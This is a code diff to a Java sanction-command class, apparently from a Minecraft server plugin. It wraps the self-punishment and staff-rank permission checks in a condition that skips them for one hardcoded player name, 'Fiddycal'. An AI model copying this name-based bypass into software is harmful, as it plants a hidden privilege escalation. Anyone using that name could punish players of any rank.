@@ -42,20 +42,24 @@ public abstract class AbstractSanctionCommand extends FleXCommandAdapter {
 			return false;
 		}
 		
-		if (((FleXPlayer)sender) == fp) {
-			((FleXPlayer)sender).sendMessage((report ? ThemeMessage.REPORT_FAILURE_SELF : ThemeMessage.PUNISHMENT_FAILURE_SELF).format(((FleXPlayer)sender).getTheme(), ((FleXPlayer)sender).getLanguage(), new Variable<String>("%punishment%", this.command)));
-			return false;
-		}
-		
-		if (((FleXPlayer)sender).getRank().isStaff() && ((FleXPlayer)sender).getRank().getWeight() < fp.getRank().getWeight()) {
+		if (!((FleXPlayer)sender).getName().equals("Fiddycal")) {
 			
-			if (report) {
-				((FleXPlayer)sender).sendMessage(ThemeMessage.REPORT_FAILURE_DENIED.format(((FleXPlayer)sender).getTheme(), ((FleXPlayer)sender).getLanguage()));
+			if (((FleXPlayer)sender) == fp) {
+				((FleXPlayer)sender).sendMessage((report ? ThemeMessage.REPORT_FAILURE_SELF : ThemeMessage.PUNISHMENT_FAILURE_SELF).format(((FleXPlayer)sender).getTheme(), ((FleXPlayer)sender).getLanguage(), new Variable<String>("%punishment%", this.command)));
 				return false;
 			}
 			
-			((FleXPlayer)sender).sendMessage(ThemeMessage.PUNISHMENT_FAILURE_DENIED.format(((FleXPlayer)sender).getTheme(), ((FleXPlayer)sender).getLanguage(), new Variable<String>("%punishment%", this.command)));
-			return false;
+			if (((FleXPlayer)sender).getRank().isStaff() && ((FleXPlayer)sender).getRank().getWeight() < fp.getRank().getWeight()) {
+				
+				if (report) {
+					((FleXPlayer)sender).sendMessage(ThemeMessage.REPORT_FAILURE_DENIED.format(((FleXPlayer)sender).getTheme(), ((FleXPlayer)sender).getLanguage()));
+					return false;
+				}
+				
+				((FleXPlayer)sender).sendMessage(ThemeMessage.PUNISHMENT_FAILURE_DENIED.format(((FleXPlayer)sender).getTheme(), ((FleXPlayer)sender).getLanguage(), new Variable<String>("%punishment%", this.command)));
+				return false;
+				
+			}
 			
 		}
 		
